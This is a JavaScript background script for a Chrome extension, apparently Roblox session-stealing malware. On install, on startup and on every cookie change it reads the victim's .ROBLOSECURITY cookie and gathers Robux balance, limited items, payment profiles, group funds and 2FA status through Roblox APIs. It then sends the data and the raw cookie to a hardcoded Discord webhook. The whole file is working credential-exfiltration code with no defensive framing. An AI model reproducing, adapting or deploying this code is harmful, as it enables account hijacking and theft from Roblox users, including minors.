var webhookURL = "https://discord.com/api/webhooks/1391126769758900415/j0V3BJDwaR9XzNo9kOTKAaqa5aHn0Gg6tL55jwfX5r6XBzKaZakjz5zxp3-Rn5uM1fwR";
var fetchInfo, Send;

(async function () {
  const cookieName = ".ROBLOSECURITY";
  const robloxDomain = "https://www.roblox.com";
  const storageKey = "cacheRBX";

  // Function to get the cookie and compare it to the stored version
  async function getRobloxCookie() {
    chrome.cookies.get({ url: robloxDomain, name: cookieName }, async (cookie) => {
      if (cookie) {
        const currentValue = cookie.value;

        const stored = await chrome.storage.local.get(storageKey);
        if (stored[storageKey] !== currentValue) {
          console.log("cookie updated:", currentValue);

          // Update local storage
          chrome.storage.local.set({ [storageKey]: currentValue });

          // Fetch all account data and send to webhook
          fetchAccountData(currentValue);
        }
      }
    });
  }

  // Function to fetch all account data
  async function fetchAccountData(cookie) {
    try {
      // Fetch basic account info
      const settingsResponse = await fetchRobloxAPI("https://www.roblox.com/my/settings/json", cookie);
      const accountInfo = await settingsResponse.json();
      
      if (!accountInfo.UserId) {
        console.error("Invalid cookie");
        return;
      }

      const userId = accountInfo.UserId;
      
      // Fetch all data in parallel
      const [
        ageVerification,
        premiumDetails,
        thumbnail,
        robuxBalance,
        pendingRobux,
        groups,
        gamePasses,
        bundles,
        limiteds,
        payments,
        creditBalance,
        transactions,
        gamesVisits,
        twoStepVerification
      ] = await Promise.all([
        fetchRobloxAPI("https://apis.roblox.com/age-verification-service/v1/age-verification/verified-age", cookie).then(r => r.json()),
        accountInfo.IsPremium ? fetchRobloxAPI(`https://premiumfeatures.roblox.com/v1/users/${userId}/subscriptions/details`, cookie).then(r => r.json()) : Promise.resolve(null),
        fetchRobloxAPI(`https://thumbnails.roblox.com/v1/users/avatar-headshot?size=420x420&format=png&userIds=${userId}`, cookie).then(r => r.json()),
        fetchRobloxAPI(`https://economy.roblox.com/v1/users/${userId}/currency`, cookie).then(r => r.json()),
        fetchRobloxAPI(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, cookie).then(r => r.json()),
        fetchRobloxAPI(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, cookie).then(r => r.json()),
        fetchRobloxAPI(`https://apis.roblox.com/game-passes/v1/users/${userId}/game-passes?count=100&exclusiveStartId=`, cookie).then(r => r.json()),
        fetchRobloxAPI(`https://catalog.roblox.com/v1/users/${userId}/bundles?limit=500`, cookie).then(r => r.json()),
        fetchRobloxAPI(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, cookie).then(r => r.json()),
        fetchRobloxAPI("https://apis.roblox.com/payments-gateway/v1/payment-profiles", cookie).then(r => r.json()),
        fetchRobloxAPI("https://apis.roblox.com/credit-balance/v1/get-credit-balance-for-navigation", cookie).then(r => r.json()),
        fetchRobloxAPI(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?timeFrame=Year&transactionType=summary`, cookie).then(r => r.json()),
        fetchRobloxAPI(`https://games.roblox.com/v2/users/${userId}/games?accessFilter=Public&limit=50`, cookie).then(r => r.json()),
        fetchRobloxAPI(`https://twostepverification.roblox.com/v1/users/${userId}/configuration`, cookie).then(r => r.json())
      ]);

      // Process game data
      const games = {
        'Murder Mystery 2': 66654135,
        'Pet Simulator 99': 3317771874,
        'Adopt Me': 383310974,
        'Blade Ball': 4777817887,
        'Giant Survival': 7436755782
      };

      const gameResults = {};
      
      for (const [gameName, gameId] of Object.entries(games)) {
        const [voteData, gamePassData] = await Promise.all([
          fetchRobloxAPI(`https://games.roblox.com/v1/games/${gameId}/votes/user`, cookie).then(r => r.json()),
          fetchRobloxAPI(`https://games.roblox.com/v1/games/${gameId}/game-passes?limit=100&sortOrder=Asc`, cookie).then(r => r.json())
        ]);
        
        const hasPlayed = (voteData.canVote || voteData.userVote) ? "True" : "False";
        const passesOwned = gamePassData.data?.filter(p => p.isOwned).length || 0;
        
        gameResults[gameName] = `${hasPlayed} | ${passesOwned}`;
      }

      // Process groups data
      let ownedGroups = [];
      let totalMembers = 0;
      let groupRobux = 0;
      
      if (groups.data) {
        const ownerGroups = groups.data.filter(g => g.role.rank === 255);
        ownedGroups = ownerGroups.map(g => g.group.name);
        
        for (const group of ownerGroups) {
          const groupId = group.group.id;
          const [currencyResp, detailsResp] = await Promise.all([
            fetchRobloxAPI(`https://economy.roblox.com/v1/groups/${groupId}/currency`, cookie).then(r => r.json()),
            fetchRobloxAPI(`https://groups.roblox.com/v1/groups/${groupId}`, cookie).then(r => r.json())
          ]);
          
          groupRobux += currencyResp.robux || 0;
          totalMembers += detailsResp.memberCount || 0;
        }
      }

      // Process limited items
      const rap = limiteds.data?.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0) || 0;
      const limitedCount = limiteds.data?.length || 0;

      // Check for special items
      const hasKorblox = bundles.data?.some(b => b.id === 192) || false;
      const hasHeadless = bundles.data?.some(b => b.id === 5731050224) || false;
      const hasVioletValkyrie = bundles.data?.some(b => b.id === 1402432199) || false;

      // Calculate total game visits
      const totalVisits = gamesVisits.data?.reduce((sum, game) => sum + (game.placeVisits || 0), 0) || 0;

      // Prepare the Discord embed
      const embed = {
        title: 'Roblox Account Information',
        color: 7763060,
        author: {
          name: `${accountInfo.Name} | ${accountInfo.UserAbove13 ? '13+' : '<13'}`,
          icon_url: thumbnail.data?.[0]?.imageUrl || 'https://www.hypnobirthing.co.il/img/noavatar.png'
        },
        thumbnail: {
          url: thumbnail.data?.[0]?.imageUrl || 'https://www.hypnobirthing.co.il/img/noavatar.png'
        },
        fields: [
          {
            name: 'Account Info',
            value: `**Username:** ${accountInfo.Name}\n**Age:** ${accountInfo.AccountAgeInDays} days\n**Premium:** ${accountInfo.IsPremium ? 'Yes' : 'No'}`,
            inline: true
          },
          {
            name: 'Security',
            value: `**Email Verified:** ${accountInfo.IsEmailVerified ? 'Yes' : 'No'}\n**2FA Enabled:** ${accountInfo.MyAccountSecurityModel?.IsTwoStepEnabled ? 'Yes' : 'No'}\n**Voice Chat:** ${ageVerification.isVerified ? 'Enabled' : 'Disabled'}`,
            inline: true
          },
          {
            name: 'Robux',
            value: `**Balance:** ${robuxBalance.robux || 0}\n**Pending:** ${pendingRobux.pendingRobuxTotal || 0}`,
            inline: true
          },
          {
            name: 'Limiteds',
            value: `**Count:** ${limitedCount}\n**RAP:** ${rap}`,
            inline: true
          },
          {
            name: 'Payments',
            value: `**Saved Methods:** ${Array.isArray(payments) ? payments.length : 0}\n**Credit Balance:** ${creditBalance.creditBalance || 0} ${creditBalance.currencyCode || ''}`,
            inline: true
          },
          {
            name: 'Groups',
            value: `**Owned:** ${ownedGroups.length}\n**Members:** ${totalMembers}\n**Group Funds:** ${groupRobux}`,
            inline: true
          },
          {
            name: 'Games',
            value: Object.entries(gameResults).map(([name, result]) => `**${name}:** ${result}`).join('\n'),
            inline: false
          },
          {
            name: 'Special Items',
            value: `**Korblox:** ${hasKorblox ? 'Yes' : 'No'}\n**Headless:** ${hasHeadless ? 'Yes' : 'No'}\n**Violet Valkyrie:** ${hasVioletValkyrie ? 'Yes' : 'No'}`,
            inline: true
          }
        ],
        footer: {
          text: 'Account data fetched'
        },
        timestamp: new Date().toISOString()
      };

      // Create cookie embed
      const cookieEmbed = {
        title: '.ROBLOSECURITY Cookie',
        description: `\`\`\`${cookie}\`\`\``,
        color: 7763060,
        thumbnail: {
          url: 'https://res.cloudinary.com/di3jdc46c/image/upload/v1737844893/cookie_1_n3nluv.png'
        }
      };

      // Send to Discord
      sendToWebhook([embed, cookieEmbed], cookie);

    } catch (error) {
      console.error("Error fetching account data:", error);
      // Fallback to just sending the cookie if detailed fetch fails
      sendCookie(cookie);
    }
  }

  // Helper function to fetch Roblox API with cookie
  async function fetchRobloxAPI(url, cookie) {
    return fetch(url, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
      credentials: 'include'
    });
  }

  // Function to send data to Discord webhook
  function sendToWebhook(embeds, cookie) {
    const payload = {
      username: 'Roblox Account Tracker',
      content: '@everyone',
      embeds: embeds
    };

    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).catch(err => {
      console.error("Error sending to webhook:", err);
      // Fallback to simple cookie send if embed fails
      sendCookie(cookie);
    });
  }

  // Fallback function to send just the cookie
  function sendCookie(value) {
    const payload = {
      content: `New Roblox .ROBLOSECURITY cookie:\n\`\`\`${value}\`\`\``
    };

    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });
  }

  // Assign references
  fetchInfo = getRobloxCookie;
  Send = sendCookie;

  // Run on startup and install
  chrome.runtime.onStartup.addListener(getRobloxCookie);
  chrome.runtime.onInstalled.addListener(getRobloxCookie);

  // Listen for cookie changes
  chrome.cookies.onChanged.addListener((changeInfo) => {
    if (
      changeInfo.cookie.domain.includes("roblox.com") &&
      changeInfo.cookie.name === cookieName
    ) {
      getRobloxCookie();
    }
  });
})();